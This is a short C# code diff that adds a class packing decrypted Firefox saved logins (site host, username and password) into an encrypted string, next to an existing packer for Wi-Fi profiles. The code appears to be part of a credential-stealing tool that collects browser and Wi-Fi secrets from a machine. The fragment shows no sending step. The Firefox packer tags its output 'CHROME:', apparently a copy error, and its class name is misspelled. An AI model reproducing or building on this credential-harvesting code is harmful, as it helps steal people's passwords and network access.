@@ -31,6 +31,27 @@
         }
     }
 
+    public class FirefoxPakcer : Packer
+    {
+        public string Pack(FirefoxDecrypt.Models.FFData profile)
+        {
+            string toencrypt = "CHROME:";
+            if (!string.IsNullOrWhiteSpace(profile.Host))
+                toencrypt += ("ACTION=" + profile.Host);
+            else toencrypt += ("ACTION=EMPTY");
+
+            if (!string.IsNullOrWhiteSpace(profile.Username))
+                toencrypt += ("USER=" + profile.Username);
+            else toencrypt += "USER=EMPTY";
+
+            if (!string.IsNullOrWhiteSpace(profile.Password))
+                toencrypt += ("PASS=" + profile.Password);
+            else toencrypt += "PASS=EMPTY";
+
+            return Encrypt(toencrypt);
+        }
+    }
+
     public class WifiPacker : Packer
     {
         public string Pack(WiPS.Modles.Profile profile)
